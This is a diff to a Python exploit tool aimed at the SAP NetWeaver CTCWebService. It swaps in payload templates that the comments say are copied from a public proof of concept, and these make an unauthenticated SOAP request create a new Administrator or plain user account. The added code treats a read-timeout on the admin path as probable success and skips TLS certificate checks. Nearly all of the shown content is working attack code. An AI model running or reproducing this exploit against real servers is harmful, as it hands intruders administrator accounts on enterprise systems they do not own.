@@ -71,18 +71,51 @@ _SOAP_PLAIN_USER = """\
   </soapenv:Body>
 </soapenv:Envelope>"""
 
-# baData payload: base64 of a simple properties-style blob the CTC wizard
-# parses as the new user's attributes.  The format was reverse-engineered
-# by chipik; we reconstruct it from first principles.
-_BA_ADMIN = """\
-username={username}
-password={password}
-role=Administrator"""
+# baData payloads: base64 of an XML blob the CTC metamodel parses as the
+# new user's attributes.  Structures taken verbatim from chipik/SAP_RECON.
 
-_BA_PLAIN = """\
-j_username={username}
-j_password={password}
-"""
+# Admin path (PCKProcess.cproc / name=Netweaver.PI_PCK.PCK).
+# {rand} is a throw-away role-name placeholder for the non-admin roles;
+# only the first Administrator assignment actually creates the admin.
+_BA_ADMIN = """\
+<PCK>
+  <Usermanagement>
+    <SAP_XI_PCK_CONFIG>
+      <roleName>Administrator</roleName>
+    </SAP_XI_PCK_CONFIG>
+    <SAP_XI_PCK_COMMUNICATION>
+      <roleName>{rand}</roleName>
+    </SAP_XI_PCK_COMMUNICATION>
+    <SAP_XI_PCK_MONITOR>
+      <roleName>{rand}</roleName>
+    </SAP_XI_PCK_MONITOR>
+    <SAP_XI_PCK_ADMIN>
+      <roleName>{rand}</roleName>
+    </SAP_XI_PCK_ADMIN>
+    <PCKUser>
+      <userName secure="true">{username}</userName>
+      <password secure="true">{password}</password>
+    </PCKUser>
+    <PCKReceiver>
+      <userName>{rand}</userName>
+      <password secure="true">{rand}</password>
+    </PCKReceiver>
+    <PCKMonitor>
+      <userName>{rand}</userName>
+      <password secure="true">{rand}</password>
+    </PCKMonitor>
+    <PCKAdmin>
+      <userName>{rand}</userName>
+      <password secure="true">{rand}</password>
+    </PCKAdmin>
+  </Usermanagement>
+</PCK>"""
+
+# Plain user path (SPC_UserManagement.cproc / name=userDetails).
+_BA_PLAIN = ("<root><user><JavaOrABAP>java</JavaOrABAP>"
+             "<username>{username}</username>"
+             "<password>{password}</password>"
+             "<userType>J</userType></user></root>")
 
 
 # ---------------------------------------------------------------------------
@@ -123,7 +156,12 @@ def _get(url: str, timeout: float) -> int:
 
 
 def _post_soap(url: str, body: str, timeout: float) -> tuple:
-    """POST a SOAP body. Returns (status, response_text, error_str)."""
+    """POST a SOAP body. Returns (status, response_text, error_str).
+
+    A read-timeout is reported with status=-1 so callers can distinguish
+    it from a hard network error (status=0).  The chipik PoC treats a
+    read-timeout on the admin path as a success signal.
+    """
     ctx = ssl._create_unverified_context()
     data = body.encode("utf-8")
     req = urllib.request.Request(
@@ -139,8 +177,13 @@ def _post_soap(url: str, body: str, timeout: float) -> tuple:
         except Exception:
             body_text = ""
         return e.code, body_text, ""
-    except (urllib.error.URLError, TimeoutError, OSError) as e:
-        return 0, "", str(e)
+    except TimeoutError as e:
+        return -1, "", f"read timeout after {timeout}s"
+    except (urllib.error.URLError, OSError) as e:
+        msg = str(e)
+        if "timed out" in msg.lower() or "timeout" in msg.lower():
+            return -1, "", msg
+        return 0, "", msg
 
 
 # ---------------------------------------------------------------------------
@@ -232,7 +275,9 @@ def exploit_create_user(host: str, port: int, username: str, password: str,
               "role": role, "evidence": "", "url": url}
 
     if role.lower() in ("administrator", "admin"):
-        ba_raw = _BA_ADMIN.format(username=username, password=password)
+        rand_val = f"ThisIsRnd{random.randint(5000, 10000)}"
+        ba_raw = _BA_ADMIN.format(username=username, password=password,
+                                   rand=rand_val)
         soap_template = _SOAP_ADMIN_USER
     else:
         ba_raw = _BA_PLAIN.format(username=username, password=password)
@@ -244,14 +289,29 @@ def exploit_create_user(host: str, port: int, username: str, password: str,
     status, text, err = _post_soap(url, soap_body, timeout)
     result["http_status"] = status
 
-    if err:
+    is_admin = role.lower() in ("administrator", "admin")
+
+    # Read-timeout on the admin path is a documented success signal —
+    # the CTC wizard processes the payload for a long time after the
+    # user has already been created.  The chipik PoC does the same.
+    if status == -1:
+        if is_admin:
+            result["success"] = True
+            result["evidence"] = (
+                "Read-timeout from CTCWebService — the wizard typically "
+                "creates the admin user before it finishes processing, "
+                "so treat as probable success (verify via UME).")
+            return result
+        result["evidence"] = f"read timeout: {err}"
+        return result
+
+    if status == 0 and err:
         result["evidence"] = f"network error: {err}"
         return result
 
     text_low = text.lower()
 
-    # Success signals from the PoC: absence of SOAP fault + presence of
-    # a <return> element with no error flag, or simply 200 with no fault.
+    # Success: HTTP 200 and no SOAP fault.
     if status == 200 and "fault" not in text_low:
         result["success"] = True
         result["evidence"] = ("CTCWebService accepted the user-creation "
@@ -259,7 +319,6 @@ def exploit_create_user(host: str, port: int, username: str, password: str,
         return result
 
     if "fault" in text_low:
-        # Extract faultstring for diagnostics
         import re
         m = re.search(r"<faultstring[^>]*>(.*?)</faultstring>",
                        text, re.DOTALL | re.IGNORECASE)
